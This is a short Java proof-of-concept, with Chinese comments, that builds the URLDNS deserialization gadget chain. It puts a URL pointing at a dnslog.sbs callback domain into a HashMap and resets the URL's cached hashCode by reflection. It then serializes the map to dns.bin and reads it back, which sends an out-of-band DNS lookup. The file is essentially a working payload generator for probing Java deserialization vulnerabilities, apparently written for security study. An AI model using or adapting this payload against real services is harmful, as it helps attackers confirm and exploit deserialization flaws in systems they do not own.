package cn.hungslabsec.playloads;
import java.io.*;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;

/**
 * @author Hungs
 * @date 2024/2/27
 * @Description Description of the file.
 */
public class URLDINS {
//    Gadget Chain:
//            HashMap.readObject()
//            HashMap.putVal()
//            HashMap.hash()
//            URL.hashCode()
    public static void main(String[] args) throws MalformedURLException, IllegalAccessException, ClassNotFoundException, NoSuchFieldException {
        HashMap<URL, Object> hashmap = new HashMap<>();
        URL url = new URL("http://4070c039.log.dnslog.sbs.");
        url.hashCode();
        Field filed = Class.forName("java.net.URL").getDeclaredField("hashCode");
        filed.setAccessible(true);  // 绕过Java语言权限控制检查的权限
        filed.set(url, 123); // 这里不要发起请求，把urL对象的hashcode改成不是-1的值
        hashmap.put(url, 1);
        filed.set(url, -1);
        try {
            Serializable(hashmap);
            Unserializable("dns.bin");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void Serializable(Object obj) throws IOException {
        //FileOutputStream() 输出文件
        //将对象obj序列化后输出到文件ser.txt
        ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream("dns.bin"));
        oos.writeObject(obj);

    }

    public static Object Unserializable(String Filename) throws IOException, ClassNotFoundException {
        //读取Filename文件进行反序列化还原
        ObjectInputStream ois= new ObjectInputStream(new FileInputStream(Filename));
        // ois.defaultReadObject();
        Object o = ois.readObject();
        return o;
    }

}
